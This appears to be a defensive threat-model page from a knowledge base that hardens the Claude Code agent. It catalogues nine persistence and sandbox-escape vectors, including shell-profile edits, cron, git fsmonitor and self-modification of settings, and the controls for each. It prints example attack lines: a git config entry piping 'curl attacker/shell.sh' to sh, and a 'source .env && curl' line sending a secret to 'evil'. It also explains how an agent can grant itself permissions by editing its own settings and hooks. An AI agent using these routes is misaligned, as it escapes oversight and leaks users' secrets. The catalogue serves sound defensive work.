---
id: agent-persistence-vectors
title: Agent Persistence & Sandbox-Escape Vectors
aliases: [persistence vectors, escape vectors catalogue, C1-C9 vectors, agent threat model]
updated: 2026-07-29
sources:
  - ../../../raw/research/agent-sandbox-escape-vectors/index.md
  - ../../../raw/research/bypass-mode-enforcement/index.md
confidence: extracted
tags: [security, threat-model, persistence, claude-code, sandbox]
---

# Agent Persistence & Sandbox-Escape Vectors

The catalogue of primitives a coding agent can be driven into, and which tier of relates_to::[[three-tier-agent-control-model]] actually addresses each. **Every vector here is reachable only through the Bash tool or an indirect subprocess** — none of them requires a novel exploit, only a permissive-enough command rule.

| # | Vector | Read/Edit deny | Bash deny | Hook | Sandbox | Primary control |
|---|---|---|---|---|---|---|
| C1 | Shell-profile persistence (`~/.zshrc`, `~/.zshenv`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`) | ✅ `Edit(~/.zshrc)` etc. | partial — redirects miss | ✅ append/write class | ✅ default-deny | deny + hook |
| C2 | launchd / cron / at (`launchctl`, `crontab`, `at`, `~/Library/LaunchAgents/*.plist`) | plist path only | command spelling only | ✅ command class | ✅ default-deny | hook + sandbox |
| C3 | `curl \| sh` remote code execution | ❌ | fragile → deny `curl`/`wget` outright | ✅ pipeline class | ✅ network allowlist | deny curl/wget + `WebFetch(domain:…)` + sandbox |
| C4 | `.env` **source**-vs-read gap (repo-specific) | ❌ — `source` is a builtin | ❌ | ✅ | ✅ env scrub | hook |
| C5 | git `core.fsmonitor` / buried bare repo | ❌ | ❌ — git executes its own config | ✅ neutralize `-c core.fsmonitor=` | ✅ confines payload | hook + `core.fsmonitor=false` |
| C6 | `DYLD_INSERT_LIBRARIES` / `LD_PRELOAD` (MITRE T1574.006) | ❌ | deny still matches past a leading assignment | ✅ flag `DYLD_*`/`LD_*` | ✅ confines child | hook + sandbox |
| C7 | Self-modification of `~/.claude/settings.json` and hooks | ✅ `Edit(~/.claude/**)` | n/a | ✅ | ✅ default-deny + managed settings | deny + sandbox + managed |
| C8 | `osascript` / Apple Events escalation | ❌ | ✅ `Bash(osascript *)` | ✅ | ✅ blocks Apple Events by default | sandbox default + deny |
| C9 | Symlink escape out of the project root | ✅ deny-by-either-path | ❌ — Bash `cat` misses | partial | ✅ fs isolation | deny + sandbox, keep CC updated |

**The three that most deserve attention:**

**C7 — self-modification is the highest-value target.** Rewriting `~/.claude/settings.json`, a project `.claude/settings.json`, or a hook script under `~/.claude/hooks/` lets the agent *grant itself permissions* or install a hook that runs on every subsequent tool call. Claude Code watches settings files and **hot-reloads `permissions`, `hooks`, and credential helpers without a restart**, so a self-write takes effect immediately. A public PoC (`s0ld13rr/claude-code-backdoor`) demonstrates exactly this. Managed settings (`allowManagedPermissionRulesOnly`, `allowManagedHooksOnly`, `disableBypassPermissionsMode`) are the un-overridable version of the defense — but two of those three keys would nullify this repo's own deliverables, so read relates_to::[[permission-mode-control-survival]] before setting any of them.

**Critical mode-dependency for C7 and C1.** Claude Code's built-in protected-path list already covers `.claude`, `.zshrc`, `.zshenv`, `.gitconfig`, `.npmrc`, `.mcp.json` and more — but it is **Allowed under `bypassPermissions`**, i.e. the built-in protection disappears in exactly the mode this repo uses for `power-mode` and `uat-auto-plus`. An explicit `permissions.deny` entry is the only user-authorable control that still covers those paths there, and deny *does* survive bypass. So the shell-profile and self-modification rows above are worth **more** under bypass, not less. See supersedes::[[permission-mode-control-survival]], which corrects the earlier report on this point.

**C5 — git config execution bypasses the permission model entirely.** A `.git/config` carrying `[core] fsmonitor = "curl attacker/shell.sh | sh"` runs on the next `git status`/`git diff`. A **buried bare repo** (e.g. `vendor/lib/.git`) is auto-discovered during traversal, so merely `cd`-ing in and running any git command fires it — no executable bit needed, unlike hooks. There is *no permission rule that blocks this*, because git is executing its own config, not making a tool call. Live advisory class (GHSA-9ccr-r5hg-74gf against Copilot CLI, TALOS-2025-2243). Hook-or-sandbox only.

**C4 — this repo's own gap.** `CLAUDE.md` bans reading `.env` but explicitly permits sourcing it. `source .env && curl -d "$SECRET" evil` exfiltrates without any file tool ever touching the file. A concrete instance of derived_from::[[deny-matches-a-spelling-not-a-capability]] living inside this repo's own policy.

Everything here is *why* tier 3 matters: the vectors converge on "a subprocess did it", and only uses::[[claude-code-sandbox]] contains a subprocess. Path-rule authoring for the deny-addressable rows is on relates_to::[[claude-code-permission-system]]; the shipped rules are relates_to::[[settings-deny-list]] (implements::[[TASK-026]]), the hook layer is implements::[[TASK-027]].
